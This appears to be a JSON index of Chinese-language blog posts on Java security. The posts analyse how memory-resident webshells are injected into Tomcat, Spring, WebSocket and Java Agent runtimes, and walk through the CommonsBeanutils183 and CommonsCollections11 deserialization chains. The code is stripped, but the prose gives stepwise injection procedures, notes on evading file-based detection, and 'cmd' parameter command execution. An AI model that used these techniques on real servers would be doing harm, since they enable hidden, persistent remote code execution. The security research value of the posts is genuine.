[{"title":"Java内存马-WebSocket内存马分析与实现","date":"2023-09-20T09:21:38.934Z","url":"/fee784a451d7.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["内存马","/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"],["WebSocket内存马","/tags/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"WebSocket介绍 WebSocket是一种在Web应用程序中实现全双工通信的协议。它提供了一种持久的连接，允许服务器和客户端之间进行双向通信，而无需通过传统的HTTP请求-响应模型来发起通信 传统的Web应用程序通常使用HTTP协议进行通信，它是一种无状态的协议，每次请求都需要在客户端和服务器之间进行完整的连接和关闭，这种请求-响应模型的限制使得在实时通信和推送数据方面存在困难 WebSocket的出现解决了这个问题，它通过在客户端和服务器之间建立一条持久的连接，可以实现实时通信和双向数据传输，与传统的HTTP请求不同，WebSocket连接在建立后会保持打开状态，允许服务器主动向客户端发送数据，而不需要等待客户端的请求 WebSocket协议具有以下特点： 双向通信：WebSocket允许服务器和客户端之间进行双向通信，可以在任何一方发送消息，而不仅仅是客户端向服务器发送请求 实时性：由于WebSocket连接是持久的，服务器可以实时向客户端推送数据，而不需要客户端发起请求。这使得实现实时聊天、实时数据更新和即时通知等功能变得更加容易 低延迟：WebSocket通过使用更有效的二进制消息格式，以及减少了HTTP的开销，可以实现较低的延迟和更高的性能 跨域支持：WebSocket支持跨域通信，允许在不同域之间进行实时通信 简化的API：WebSocket提供了一组简单易用的API，使得开发人员可以方便地创建和管理WebSocket连接，发送和接收消息 WebSocket内存马Tomcat的WebSocket（WebSocket）是一种在单个TCP连接上进行全双工通信的协议。它允许客户端和服务器在单个TCP连接上交换数据。WebSocket是一种在单个TCP连接上进行全双工通信的协议，这使得它比HTTP更轻量级，并且可以在不关闭连接的情况下发送和接收数据 在Tomcat中，想要实现WebSocket服务端一种办法是继承 Endpoint 抽象类，另一种办法就是直接使用注解 @ServerEndpoint，客户端使用注解 @ClientEndpoint（本文不会使用到客户端） @ServerEndpoint注解实现@ServerEndpoint 注解作为服务端端点，指定一个URL路径让客户端进行连接，Endpoint 和Tomcat一样有生命周期的，其方法如下： onOpen 开启一个新会话时调用，客户端和服务端握手连接时调用，对应 @OnOpen 注解 onMessage 接收到客户端发送的消息时调用，对应 @OnMessage 注解 onError 出现异常时调用，对应 @OnError 注解 onClose 会话关闭时调用，对应 @OnClose 注解 @ServerEndpoint 注解可以使用一些属性来配置WebSocket端点的行为和特性 value 指定WebSocket端点的访问路径，例如：@ServerEndpoint(&quot;/ws&quot;) decoders 指定用于解码接收到的消息的解码器类，可以指定多个解码器，使用数组形式，例如：@ServerEndpoint(value = &quot;/ws&quot;, decoders = &#123;MyDecoder.class&#125;) encoders 指定用于编码发送给客户端的消息的编码器类，可以指定多个编码器，使用数组形式，例如：@ServerEndpoint(value = &quot;/ws&quot;, encoders = &#123;MyEncoder.class&#125;) configurator 指定一个自定义的 ServerEndpointConfig.Configurator 类，用于配置WebSocket端点的配置，例如：@ServerEndpoint(value = &quot;/ws&quot;, configurator = MyConfigurator.class) subprotocols 属性用于指定支持的子协议（subprotocols），子协议是指在WebSocket连接建立时，客户端和服务器之间进行的协议交换，以确定在连接期间使用的协议 继承抽象类实现使用注解来实现WebSocket是比较简单的，因为注解可以自动化完成配置。如果我们想要使用继承抽象类来实现的话，就没有那么简单了 在Tomcat中 org.apache.tomcat.websocket.server.WsSci 类用来加载WebSocket服务，Tomcat WebSocket使用了SCI机制，什么是SCI机制呢？ SCI（Server Configuration Interface）是一种服务器配置接口，用于在服务器启动时动态配置WebSocket应用程序。SCI机制允许服务器在运行时动态配置WebSocket应用程序，例如添加和删除端点（endpoint）、设置消息过滤器等。这有助于提高WebSocket应用程序的灵活性和可扩展性 Tomcat WebSocket使用了SCI机制来实现服务端动态配置，当服务器启动时，它将加载 WEB-INF/web.xml 文件中的配置，这些配置包括端点（endpoint）、消息过滤器等。然后，将这些配置应用到 WebSocketContainer 对象中，从而实现动态配置 调用栈分析当Tomcat启动时，会自动调用 WsSci 类的 onStartUp 方法，该类实现了 ServletContainerInitializer 接口，重写了 onStartUp 方法，那么我们就从这个方法打个断点分析一下 在 onStartUp 方法中，调用了 init 方法，跟进该方法看一下 可以看到，实例化了 WsServerContainer 类，并将属性名 javax.websocket.server.ServerContainer 和 WsServerContainer 对象添加到ServletContext上下文中，并返回了 WsServerContainer 对象 接着在 onStartup 方法中对每个WebSocket端点应用程序类进行判断，如果该类使用了 ServerEndpoint 注解则添加到 scannedPojoEndpoints 集合中，其中就有我们写的恶意WebSocket端点 创建了两个集合，用于WebSocket端点配置和扫描结果的过滤操作，由于 serverApplicationConfigs 集合是空的，则将 scannedPojoEndpoints 集合所有元素添加到 filteredPojoEndpoints 集合中，此时，我们写的恶意WebSocket端点应用程序类已经被添加到 filteredPojoEndpoints 集合中了 在这里遍历 filteredPojoEndpoints 集合并调用 sc.addEndpoint 方法将恶意WebSocket端点应用程序类添加WebSocket端点，跟进这个方法看一下 在这个方法中，定义了一个 ServerEndpointConfig 类对象，从注解中读取value属性值，也就是我们之前写的WebSocket访问路径 不是重点内容，我们就不看了，直接看重点，先是对 sec 对象进行赋值，调用了 ServerEndpointConfig.Builder.create(pojo, path) 创建WebSocket端点配置对象，最后调用了 addEndpoint 方法 根据上面的分析，我们大概知道如何把我们的注册恶意WebSocket端点了，有如下步骤： 指定一个WebSocket访问路径 获取ServletContext对象 获取ServerEndpointConfig对象 获取WsServerContainer对象，由于WsServerContainer对象实现了ServerContainer接口的 addEndpoint 方法，这里我们直接获取ServerContainer对象 最后调用ServerContainer对象的 addEndpoint 方法，将ServerEndpointConfig对象添加到WebSocket端点 动态实现WebSocket服务端 指定WebSocket访问路径后添加到端点 使用WebSocket客户端连接工具连接即可执行命令"},{"title":"Java内存马-Agent内存马分析与实现","date":"2023-09-14T01:34:38.823Z","url":"/c92b2696b98a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["内存马","/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"],["Agent内存马","/tags/Agent%E5%86%85%E5%AD%98%E9%A9%AC/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"Java Agent简介JDK1.5以后引入了 java.lang.instrument 包，该包常用于日志记录、性能监控、安全监察、诊断等场景，Java Agent可以在不影响正常编译的情况下来修改字节码 使用Java Agent需要编写一个代理类和一个代理配置文件（META-INF&#x2F;MANIFEST.MF），并将其打包为一个JAR文件。然后，在启动Java应用程序时，通过-javaagent参数指定代理JAR文件的路径，Java虚拟机（JVM）将会加载并运行代理 Java Agent也是一个Java类，普通类的入口函数通常是 main 方法，而Java Agent的入口函数为 premain 或 agentmain 方法 Java Agent支持两种加载方式： premain 方法，在启动时加载 agentmain 方法，在启动后加载 启动时加载启动时加载agent，需要实现premain方法，还需要在jar文件清单中包含 Premain-Class 属性 编写一个实现premain方法的类 还需要编写 MANIFEST JAR文件清单，这里保存为 Agent.MF 文件，文件最后需要有一行空行 编译Agent_Premain类为class文件 打包成jar文件 执行完后即可生成Agent.jar文件 再生成一个普通的类 再写一个JAR文件清单 再进行编译和打包成JAR文件 我们运行Test.jar文件时，在前缀加上 -javaagent 参数加载 Agent.jar，test1 为Agent.jar文件入口函数premain的参数 运行之后可以发现Agent.jar文件先被执行了 启动后加载VirtualMachineVirtualMachine类是Java虚拟机的一个抽象表示，它提供了与虚拟机相关的操作和属性的访问方法，主要用于与Java虚拟机进行交互和管理，通常用于开发调试工具和性能分析工具 该类我们主要会使用以下方法： VirtualMachineDescriptorVirtualMachineDescriptor类是描述Java虚拟机实例的信息的类，它提供了一些方法来获取虚拟机的标识、名称、虚拟机参数等信息 agentmain示例 编写一个普通类，用于模拟程序运行 编写实现agentmain方法的类，并配置JAR文件清单，生成class文件和生成JAR文件 编写一个用于连接名称为 VirtualMachine_Test 的JVM，加载指定的Agent 当我们运行 VirtualMachine_Test 类后，再运行 Inject_Agent 类，可以发现我们的自定义Agent已经成功被加载 动态修改字节码InstrumentationInstrumentation是JVMTIAgent（JVM Tool Interface Agent），用于在运行时修改、监控和分析Java应用程序的字节码，它允许开发人员在应用程序启动之前或在运行时对字节码进行转换和增强 Instrumentation是一个接口，其主要方法如下： ClassFileTransformer ClassFileTransformer是一个接口，它只有一个 transform() 方法，该方法返回字节数组，用于在类加载期间对字节码进行转换，可以在类加载过程中修改类的字节码，以实现各种目的，如增加、删除或修改类的方法、字段等 addTransformeraddTransformer() 方法注册一个转换器，编写 ClassFileTransformer 接口自定义类注册自定义的转换器，在该转换器中加载恶意的代码，当类加载时，就会自动调用自定义的转换器的 transform 方法 getAllLoadedClassesgetAllLoadedClasses 方法可以列出所有已加载的Class retransformClassesretransformClasses 方法可以对已加载的Class重新定义，若目标类已经加载，调用该函数可以重新触发转换器的拦截，对目标类重新定义 Agent内存马这里我们准备的环境是SpringBoot，模拟在SpringBoot环境下，注入Agent内存马 先写一个转换器，对 ApplicationFilterChain 类的 doFilter 方法进行添加恶意代码 这里，我们就使用 agentmain 方法，用于启动后加载Agent场景，在该方法中主要是寻找我们修改的 ApplicationFilterChain 类，触发我们上面写的转换器 transform 方法 编写一下 MANIFEST.MF 文件 将 tools 和 javassist 依赖一并打包 使用 VirtualMachine 来加载Agent，这个类主要是模拟将 AgentMain.jar 和 Inject_Agent 类文件上传到受害者服务端，运行 Inject_Agent 程序寻找SpringBoot的程序连接到该程序的JVM，进行加载恶意Agent 模拟环境中，启动SpringBoot为真实的受害者服务端，运行 Inject_Agent 程序来进行注入Agent，没有出现报错说明成功注入了 访问任意路径，加上cmd参数即可执行任意命令"},{"title":"Java内存马-Spring内存马分析与实现","date":"2023-09-07T08:22:25.027Z","url":"/6802f3c82607.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["内存马","/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"],["Spring内存马","/tags/Spring%E5%86%85%E5%AD%98%E9%A9%AC/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"Spring相关知识BeanBean是被Spring容器管理的对象，SpringBoot使用了SpringFramework的依赖注入（DI）和控制反转（IOC）功能，通过注解将对象注册为Bean，使其能够被自动创建、管理和使用 IoC容器IoC控制反转（Inversion of Control）也称为应用上下文，是Spring框架的核心概念之一，IoC是一种设计模式，它提供了一种将对象的创建和依赖关系的管理从应用程序代码中解耦的方式，负责对象的创建和依赖关系的管理，你只需要通过注解或配置文件告诉Spring容器哪些类需要被管理，Spring容器就会负责创建这些对象，并自动解析和注入它们的依赖关系 ApplicationContextApplicationContext是Spring框架中的一个接口，它是Spring IoC容器的核心接口之一，用于管理和组织Spring Bean对象的创建、配置和依赖注入等操作 ApplicationContext接口继承于BeanFactory接口，获取了ApplicationContext的实例就是获取了IoC容器的引用 WebApplicationContextWebApplicationContext是一个用于管理Web应用程序的Spring框架的上下文，它是Spring框架中的一个重要组件，用于加载和管理应用程序中的所有bean，以及提供对应用程序配置的访问 RootContext &amp; ChildContext在Spring中，存在两种类型的上下文：Root Context（根上下文）和Child Context（子上下文） Root Context是WebApplicationContext的一个实例，它代表整个Web应用程序的上下文，它通常在应用程序的启动阶段被创建，并负责加载和管理与整个应用程序相关的bean和配置。Root Context是整个应用程序的父上下文，所有的子上下文都可以访问和继承Root Context中的bean和配置 Child Context是WebApplicationContext的另一个实例，它代表某个特定的模块或子应用程序的上下文，它可以通过Root Context创建，并可以访问和继承Root Context中的bean和配置。子上下文可以有自己的独立配置和特定的bean定义，同时也可以共享Root Context中的bean。 Controller型内存马注入原理需要动态注册内存马，那么就和Tomcat内存马类似，我们需要知道如何动态的注册Controller，我们需要做如下的事情： 获取上下文环境，用来获取Bean 编写恶意Controller 配置Controller路径映射 获取上下文环境获取上下文环境有四种方法 ContextLoader WebApplicationContextUtils RequestContextUtils getAttribute 注册ControllerRequestMappingHandlerMappingRequestMappingHandlerMapping 是Spring MVC中的核心Bean，用于处理请求映射和路由，RequestMappingHandlerMapping负责解析和处理带有 @RequestMapping 注解的控制器方法，并将其与相应的请求路径进行匹配，它会根据请求的URL路径和其他条件，确定要调用的控制器方法，Spring将Controller解析成 RequestMappingInfo 对象，再注册进RequestMappingHandlerMapping中 RequestMappingHandlerMapping是由Spring进行管理的，所以我们可以直接通过ApplicationContext来获取这个Bean registerMappingregisterMapping 方法用于在Web应用程序中注册URL映射，它可以将一个URL路径映射到一个特定的Controller方法，以便处理该URL的请求 PatternsRequestConditionPatternsRequestCondition类用于表示请求URL的匹配条件，类似在SpringBoot中通过 @RequestMapping 来指定某个Controller的访问路径 RequestMethodsRequestConditionRequestMethodsRequestCondition类用于表示请求方法（HTTP Method）的匹配条件，类似在注解 @RequestMapping 配置允许的请求方法 RequestMappingInfoRequestMappingInfo类用于表示请求映射的详细信息，该类将请求路径和HTTP方法进行关联，在处理请求时，可以根据请求的URL、HTTP方法等信息，来匹配对应的RequestMappingInfo对象 实现恶意Controller Controller内存马实现 根据上面对Controller注册的了解，我们就可以写出Controller内存马 在SpringBoot2.6.0版本开始，官方修改了URL路径的默认匹配策略，需要在 application.properties 中配置如下信息： 或者在不改配置的前提下，将这个恶意Controller内存马实现 WebMvcConfigurer 接口，重写 configurePathMatch 方法来修改配置 Interceptor型内存马Interceptor（拦截器）是Spring MVC框架中用于处理请求的一个重要组件，拦截器允许在控制器处理请求之前和之后执行自定义的逻辑，它提供了一种在请求处理过程中进行预处理和后处理的机制，以实现一些通用的功能和行为，例如身份验证、日志记录、数据转换等 在Spring MVC中有三个拦截器接口： HandlerInterceptor 这是最常用的拦截器接口，用于拦截请求并进行处理 HandlerInterceptorAdapter 是一个适配器类，实现了 HandlerInterceptor 接口，并提供了空实现的方法，可以通过继承该类来自定义拦截器 WebRequestInterceptor 是一个更底层的拦截器接口，它不仅可以拦截请求，还可以拦截异步请求和WebSocket请求 实现恶意Interceptor我们选择使用 HandlerInterceptor 接口来实现自定义拦截器，该接口有三个方法 preHandle 方法在请求处理之前进行拦截 postHandle 方法在请求处理之后进行拦截 afterCompletion 方法在整个请求完成之后进行拦截 我们编写了一个类，实现了 HandlerInterceptor 接口并重写 preHandle 方法，这里我们选择在请求处理之前执行恶意代码 由于我们现在还没有动态的将我们自定义的拦截器添加到拦截器列表中，所以我们目前需要手动的配置SpringMVC配置文件 在SpringMVC配置文件中配置拦截器 再写一个普通的Controller，用于请求Controller从而触发拦截器 当我们访问路径为 /index 控制器时，会触发我们写的自定义拦截器的 preHandle 方法，接着我们就可以直接在后面加上 cmd 参数执行命令了 调用栈分析 当我们访问某个Controller时，就会调用自定义拦截器 InterceptorShell 类的 preHandle 方法 从调用栈上可以看出在HttpServelt类的service方法中调用的是SpringMVC的FrameworkServlet类的service方法，我们直接看关键方法 doDispatch，该方法用于实际处理请求的分发和调度 在该方法中调用了 mappedHandler 的 applyPreHandle 方法，往上找发现 mappedHandler 是通过调用 getHandler 方法获得的 在 getHandler 方法中，循环遍历了 handlerMappings 属性的对象并调用了 getHandler 方法 调用 RequestMappingHandlerMapping 的 getHandler 方法时，其实会调用到 AbstractHandlerMethodMapping 的 getHandler 方法 在 AbstractHandlerMapping 类的 getHandler 方法中调用了 getHandlerExecuationChain 方法 HandlerExecutionChain用于封装处理器（Handler）及其相关的拦截器（HandlerInterceptor） 这里先实例化 HandlerExecutionChain 类，再循环遍历 adaptedInterceptors 属性，判断每个 interceptor 是否是 MappedInterceptor 对象的实例，我们写的自定义拦截器不是 MappedInterceptor 对象的实例，则调用 chain 对象的 addInterceptor 方法 在 HandlerExecutionChain 类的 addInterceptor 方法中，调用了 interceptorList 属性的 add 方法，而每个List元素都是 HandlerInterceptor 对象，拦截器链是按照添加顺序依次执行的，在这里就是向拦截器链中添加一个 HandlerInterceptor 实例 注册Interceptor根据上面的分析，我们大概知道如何来注册Interceptor了，大致流程如下： 获取 AbstractHandlerMapping 类的 adaptedInterceptors 属性 编写一个自定义恶意Interceptor拦截器类 将自定义恶意Interceptor拦截器对象添加到 adaptedInterceptors 属性中 只要添加到 adaptedInterceptors 属性中了，就能在拦截器链中按顺序执行拦截器 按照上面的步骤编写代码，先访问 /interceptor 路径，再访问该路径时带上 cmd 参数即可，以上就是Interceptor型内存马的分析与实现"},{"title":"Java内存马-Tomcat内存马内存马分析与实现","date":"2023-08-24T03:23:10.833Z","url":"/60790f086bef.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["内存马","/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"],["Tomcat内存马","/tags/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"Tomcat内存马介绍Tomcat内存马就是通过动态的将恶意组件添加到运行中的Tomcat服务器中，其内存马可分为四种类型，分别是：Listener型、Filter型、Servlet型、Value型 由于在Tomcat7.x版本开始对Servlet3.0的支持，可以进行动态的注册组件 传统JSP木马 以上就是最传统的一句话木马，这种木马特征太过明显，很容易被查杀 传统的JSP木马容易被杀软、WAF等安全设备进行拦截，实战的时候如果被拦截就很难受了，文件落地就算落地了也很容易被杀。Java内存马就是“无文件木马”，内存马存在于内存中，如果通过文件来排查木马的话是排查不到的，内存马隐蔽性强 Listener型内存马Listener是Tomcat服务器中的一种扩展机制，用于在Tomcat的生命周期中监听和处理特定的事件。它是基于Java Listener模式的实现，用于在Tomcat启动、停止、创建和销毁Web应用程序等事件发生时执行相应的逻辑 Listener型内存马就是需要在对方目标服务器动态的注册一个恶意的Listener EventListener 类根据事件不同分为三种： ServletContextListener 用于监听ServletContext的生命周期事件，比如初始化和销毁 HttpSessionListener 用于监听HttpSession的生命周期事件，比如创建和销毁 ServletRequestListener 用于监听ServletRequest的生命周期事件，比如创建和销毁 调用栈分析根据上面的三种监听事件，ServletRequestListener 用于监听 ServletRequest 对象，当请求任意资源就都会触发 ServletRequestListener.requestInitialized() 方法，如果我们能成功动态注册到服务器中，那么我们可以在任意资源中执行恶意脚本 接下来就是分析如何动态注册到服务器中 在 ContextConfig 类中配置Web应用程序的上下文，在该类中对Servlet、Filter和Listener进行了注册 这里调用了 context.addApplicationListener() 方法向应用程序中添加了监听器，我们看下哪个地方调用了这个方法 有 FailedContext 和 StandardContext 两个类调用了 addApplicationListener() 方法，FailedContext 类中没有做什么操作就不看了 在 StandardContext 类的 addApplicationListener() 方法中将配置中的Listener添加到了 applicationListeners 字符串数组中 当启动应用时，就会调用到 StandardContext 类的 listenerStart() 方法 findApplicationListeners() 方法返回的就是上面添加到 applicationListeners 字符串数组的监听器，后面就不继续调试了，这个方法我们只要知道是开启了监听客户端的请求即可 既然上面已经将我们要添加的监听器添加进去了，那么我们在请求时应该可以自动触发这个监听器，那么我们在我们写的自定义监听器上打个断点看一下 Tomcat启动后，随便请求一个路径，自动到了断点这里，那么我们看下是怎么过来的 在 StandardContext 类 fireRequestInitEvent() 方法中获取了所有应用监听器，对每个监听器创建了一个 ServletRequestEvent 事件对象，然后调用了每个 listener 的 requestInitialized() 方法 根据上面的分析，在 requestInitialized() 方法写入木马即可，当然写在 requestDestroyed 也是可以的，因为在 StandardContext 类中还有 fireRequestDestroyEvent() 方法，该方法在请求销毁时触发，这里就不过多介绍了 动态注册Listener编写ListenerMemShell.jsp文件 这里为什么要通过反射来获取 StandardContext 类呢？在上面我们分析请求创建的监听事件时，是在 StandardContext 类中调用的 requestInitialized() 方法来处理的，那么我们就必须要先获取到这个类，然后将我们的自定义监听器实例化，添加到 StandardContext.applicationListeners 字符串数组中 想要通过反射来获得一个 StandardContext 类有两种方法： 通过反射获取 request 对象的 request 属性，通过调用 request.getContext() 方法获得 StandardContext 对象 先获取 request 对象的 context 属性获得一个 ApplicationContext 类对象，再获取 ApplicationContext 类对象的 context 属性获得 StandardContext 类对象 内存马利用 先访问内存马文件，将我们写的恶意Listener动态注册到服务器上 随便访问一个路径，加上参数cmd，值为想要执行的命令 Filter型内存马 用一张网上的图，来解释一下，Filter是通过 FilterChain 来实现的，如果有Filter拦截器，那么则先经过Filter拦截器才能到达Servlet 我们先写出Filter内存马的雏形，接下来我们就要分析如何动态注册到服务器中 调用栈分析DEBUG模式启动Tomcat服务器，在 doFilter() 方法上打上断点，来看下整个调用栈的过程，以下为调用栈的过程 在 ApplicationFilterChain 类的 internalDoFilter() 方法中通过 filterConfig 对象获取了 filter 对象，而 filter 是通过 filterConfig 对象获取的 filters 属性是 ApplicationFilterConfig 数组，看一下哪个地方对这个属性进行了赋值 在 ApplicationFilterChain.addFilter() 方法中对 filters 属性进行了赋值 这里其实就是将传过来的 filterConfig 进行了判断，然后加到了 filters 属性里了，那再看一下是哪个地方调用了这个方法 在 ApplicationFilterChain.createFilterChain() 方法中调用了 addFilter() 方法，我们直接看重点的地方 ApplicationFilterChain 应用程序过滤器链是一个由多个过滤器组成的链式结构，用于在请求到达目标资源之前或之后对请求和响应进行处理。通过将过滤器按照一定的顺序添加到过滤器链中，可以实现对请求和响应的过滤、验证、修改等操作 这里创建一个空的应用程序过滤器链，用于后续添加过滤器并处理请求 filterMaps 通过 wrapper 对象的 getParent() 方法获取 StandardContext 对象 再通过 StandardContext 类对象 findFilterMaps() 方法来获取 FilterMaps 对象，该对象中存储的是Filter各个信息 接着后面就是对 filterMaps 对象数组进行遍历，通过调用 StandardContext 类 context 对象的 findFilterConfig() 方法来获取对应的 FilterConfig filterMap 每个 filterMap 中存放的就是各个filter的路径映射信息 filterConfig filterConfig 中包含了上下文的信息和具体 filter 对象以及 filterDef 对象 filter 对象中存放了 filter、filterClass 和 filterName 等信息 动态注册Filter根据上面的分析，我们大致的知道了如何动态创建一个Filter了 大致的步骤如下： 写一个恶意Filter 获取 StandardContext 对象，再通过 StandardContext 对象获取 filterConfigs 字段 实例化恶意Filter类，创建 FilterDef 类的实例化对象，将这个恶意Filter类封装到 FilterDef 对象中，添加 FilterDef 对象的必要属性，再将封装过后的 FilterDef 添加到 StandardContext 对象中 创建 FilterMap 类实例化对象，添加 Filter 的URL路径和名称以及调度器（过滤器何时被调用触发），将封装好的 FilterMap 对象也添加到 StandardContext 对象中 通过反射获取 ApplicationFilterConfig 类的私有构造方法，将 StandardContext 对象和 FilterDef 对象作为该类的私有构造方法参数实例化对象 将Filter名称和 ApplicationFilterConfig 对象添加到 filterConfigs 中 Servlet型内存马 在Tomcat中，需要经过Listener和Filter之后才会调用到Servlet 根据Servlet接口的这些方法，我们可以在 service 方法中写入具体恶意代码 恶意Servlet我们已经写好了，接下来就是需要找如何将Servlet动态的注册到服务器中 调用栈分析在 service 方法上打上断点，DEBUG模式启动Tomcat查看调用栈 发现在 service 方法上的断点是从Filter那边过来的，是的，在上面我们就说过，Servlet创建实例后会立即调用 init 方法，那么我们应该在 init 方法上打上断点 在 StandardWrapper 类 initServlet 方法中调用了servlet的 init 方法 这里通过实例管理器对 servletClass 进行实例化对象并强转成 Servlet 类型 在 setServletClass 方法中设置了 servletClass 属性，再看看在哪里调用了这个方法 我们查看代码，可以发现是在 ContextConfig 类 configureContext 方法中调用的，这里和Listener内存马调用栈差不多，Listener也是在这里向应用程序中添加监听器 动态注册Servlet根据上面的代码分析，我们知道我们需要配置Servlet的 loadOnStartup、name、servlet、servletClass，然后再通过 StandardContext 类对象调用 addChild 和 addServletMappingDecoded 方法添加进去即可 loadOnStartup 属性的值必须大于0，才会被添加到list中加载调用 Valve型内存马Valve是Apache Tomcat中的一个组件，用于在请求处理过程中对请求和响应进行拦截和处理。Valve可以在Tomcat容器中的不同阶段对请求和响应进行修改、记录或者验证等操作，以满足特定的需求 Valve是一个可插拔的组件，可以根据需要配置和定制。Tomcat中的每个容器（如Host、Context等）都可以配置一个或多个Valve。Valve按照配置的顺序依次处理请求和响应，类似于责任链模式。每个Valve都可以对请求和响应进行修改，然后将其传递给下一个Valve，最终交给相应的Servlet进行处理 Valve可以用于实现各种功能，例如： 记录访问日志：Valve可以在请求到达和响应离开时记录一些关键信息，如请求URL、响应状态码、响应时间等，用于分析和监控 访问控制和权限验证：Valve可以根据配置的规则对请求进行验证，如IP白名单、用户认证等，以保护应用程序的安全 请求过滤和处理：Valve可以对请求进行过滤和处理，如字符编码转换、请求参数解析、请求重定向等，以提供更好的用户体验 压缩和缓存：Valve可以对响应进行压缩和缓存处理，以提高应用程序的性能和效率 负载均衡和集群：Valve可以用于实现负载均衡和集群功能，将请求分发给多个后端服务器进行处理 请求转发和重定向：Valve可以根据配置的规则将请求转发到其他URL或处理器，实现请求的重定向和分发 具体如何理解Valve，从网上找来的图 Tomcat四大组件Engine、Host、Context和Wrapper都有其对应Valve类，分别是： StandardEngineValve StandardHostValve StandardContextValve StandardWrapperValve 这些Valve类，共同维护 StandardPipeline 类实例 写一个类继承 ValveBase 类，并且重写 invoke 方法，在 invoke 方法中编写恶意代码，这就可以了，那么重点是我们如何把这个 Valve 进行加载呢？ 在 Servlet 类 init 方法调用栈中有获取 Pipline 的操作并且调用了 invoke 方法，依次跟进这些方法看看做了什么 在 Connector 类 getService 方法中返回了 service 属性，该属性是 StandardService 类 StandardService 类 getContainer 方法返回了 engine 属性，该属性是 StandardEngine 类 ContainerBase 类 getPipeline 方法中返回了 pipeline 属性，该属性是 StandardPipeline 类 StandardPipeline 类 getFirst 方法中返回了 basic 属性，该属性是 StandardEngineValve 类 在 StandardEngineValve 类 invoke 方法中，host 对象是 StandardHost 类型的，接着又重新获取 Pipeline，这里就不继续跟进了，直接看 StandardHost 类的 invoke 方法 再次调用 getFirst 方法发现已经有了一个Valve了，这里就直接返回了这个Valve 到了这里我们就不用继续往下看了，只要我们添加了Valve就能执行到，所以我们看看在哪里能添加Valve 在 StandardPipline 类中有一个 addValve 方法，可以将我们写好的恶意Valve类添加进去 根据上面的分析，写内存马就简单很多了，在Servlet中完成添加恶意Valve类 获取 Pipeline 很简单，直接调用 StandardContext 类 getPipeline 方法即可，因为 StandardContext 类继承了 ContainerBase 类 动态注册Valve那么动态注册Valve，分为以下步骤： 编写一个恶意Valve类 获取StandardContext 通过StandardContext类对象获取Pipeline Pipeline类对象调用addValve方法完成添加 上面的操作都是在Servlet加载时完成的 在JSP文件中写Valve型内存马就更简单了，不再过多描述"},{"title":"CommonsBeanutils183反序列化链","date":"2023-08-21T06:48:57.128Z","url":"/45315f66374a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsBeanutils183","/tags/CommonsBeanutils183/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"简介Apache Commons BeanUtils 是一个开源的 Java 库，提供了对 Java Bean 操作的工具类和方法。它可以简化 Java Bean 的属性复制、反射调用和动态操作等任务，使得开发人员可以更加方便地处理 Java Bean 下面是一些 Commons BeanUtils 提供的主要功能和特性： 属性复制：BeanUtils 提供了 copyProperties 方法，用于将源对象的属性值复制到目标对象中，无需手动编写属性的逐个复制代码。 动态操作：BeanUtils 提供了一些方法，可以通过反射动态设置和获取 Java Bean 的属性值，避免了直接使用反射 API 的繁琐操作。 数据转换：BeanUtils 提供了 convert 方法，用于在不同类型之间进行属性值的转换，例如将字符串转换为日期对象，或者将字符串转换为枚举类型。 嵌套属性访问：BeanUtils 支持处理嵌套属性，可以通过使用点号 . 来访问嵌套的属性，例如 user.address.street。 列表和映射操作：BeanUtils 提供了对列表和映射的操作方法，可以方便地处理集合类型的属性。 注册转换器：BeanUtils 允许开发人员注册自定义的类型转换器，以便在属性复制和数据转换过程中使用。 支持多种数据源：BeanUtils 不仅可以操作普通的 Java Bean，还可以操作其他数据源，如 ResultSet、Map、XML 等。 Apache Commons BeanUtils 提供了一套强大而灵活的工具，使得在 Java 开发中处理 Java Bean 变得更加简单和高效。无论是属性复制、反射调用还是动态操作，BeanUtils 都可以成为开发人员的便捷助手 利用条件Commons-Beanutils &lt;&#x3D; 1.9.4 JDK8版本 利用链 利用链分析CommonsBeanutils183利用链大致思路和CC2利用链差不多，只不过后续使用的比较器不同而已 PriorityQueue 由于这条链使用了另一个比较器 BeanComparator 类，所以在实例化 PriorityQueue 类对象时，需要讲 BeanComparator 类对象作为 PriorityQueue 类的构造方法参数 接下来就是一连串的调用了，CC2和CC4都有使用 PriorityQueue 类，这里就不再详细叙述了 BeanComparator 在 BeanComparator 类的 compare() 方法中调用了 PropertyUtils 类的 getProperty() 方法 PropertyUtils 在这个类中，获取了 PropertyUtilsBean 的实例并调用 getProperty() 方法 PropertyUtilsBean 接下来就是一连串的调用了，那么我们如何加载恶意字节码呢？之前学CC链的时候我们知道，在 TemplatesImpl 类的 newTransformer() 方法中可以加载字节码并执行，那么在 BeanComparator 类中的 property 属性值就必须是 outputProperties，后续通过反射来修改这个属性值 TemplatesImpl 到了这里，在 TemplatesImpl 类的 getOutputProperties() 方法中调用了 newTransformer() 方法后就成功加载了恶意字节码执行恶意代码了 根据上面的分析，我们写出利用链EXP的中间部分 这里讲 queue 和 property 两个属性通过反射获取来修改属性值是因为避免在序列化时调用了 PriorityQueue 类的 add() 方法后就执行了恶意代码 反序列化链EXP"},{"title":"CommonsCollections11利用链","date":"2023-08-19T02:34:27.738Z","url":"/ea620075ac0a.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["CommonsCollections11","/tags/CommonsCollections11/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用条件Commons-Collections 3.1 - 3.2.1版本 不限制JDK版本 利用链 利用链分析在CC11利用链中，使用了CC2和CC6的一些链，在CC11利用链中反序列化入口类是 HashSet 类，如果不先分析就直接看代码是有点懵的 先放一张整个调用栈的过程图 HashSet 在 HashSet 类的 readObject 方法中调用了 map 属性的 